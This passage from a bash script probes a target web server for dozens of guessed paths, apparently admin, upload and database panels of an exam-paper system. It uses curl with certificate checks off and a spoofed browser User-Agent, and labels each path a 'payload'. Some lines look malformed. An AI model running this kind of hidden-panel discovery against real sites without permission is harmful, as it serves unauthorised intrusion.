         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MgmtQPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MgmtQPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PlatformQPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PlatformQPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingModuleQPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingModuleQPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystemDataUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystemDataUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloudDataSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloudDataSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaperAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaperAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBDashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBDashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchUploadQPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchUploadQPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFile_ProcessingSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFile_ProcessingSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperHandlingModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperHandlingModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPB-Service/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPB-Service/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Manager_QPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Manager_QPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchProcessorQPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchProcessorQPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BulkUploadQPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BulkUploadQPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutoUploadQPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutoUploadQPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["WorkflowQPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"WorkflowQPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataSyncQPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataSyncQPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DatabaseManagerQPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DatabaseManagerQPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringTool-QPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringTool-QPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDoc-ProcessingSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDoc-ProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandler_Admin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandler_Admin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AccessControlQPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AccessControlQPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploader_Control/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploader_Control/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutoUpload_QPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutoUpload_QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataSync-QPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataSync-QPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Panel-QPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Panel-QPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_P_Suite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_P_Suite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingModule_QPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingModule_QPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileUpload-QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileUpload-QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSystem-Q_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSystem-Q_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessingFileUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessingFileUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["OpsQPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"OpsQPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataProcessing_QPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataProcessing_QPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Manager-QPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Manager-QPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationSystemQPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationSystemQPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Control-QPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Control-QPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystem_DataUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystem_DataUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataPipelineQPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataPipelineQPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmt_DataSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmt_DataSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["CloudSyncQPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"CloudSyncQPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DatabaseManagerQPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DatabaseManagerQPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Workflow-QPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Workflow-QPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AccessControl-QPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AccessControl-QPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystem_Handling/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystem_Handling/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingQPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingQPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileProcessor_QPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileProcessor_QPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DashboardQPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DashboardQPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaper_Suite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper_Suite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulk_Panel/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulk_Panel/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Control_QPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Control_QPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabase-Upload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabase-Upload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataProcessing-QPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataProcessing-QPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaper-Module/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper-Module/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataPipelineQPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataPipelineQPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Control-Q_P/"]: "
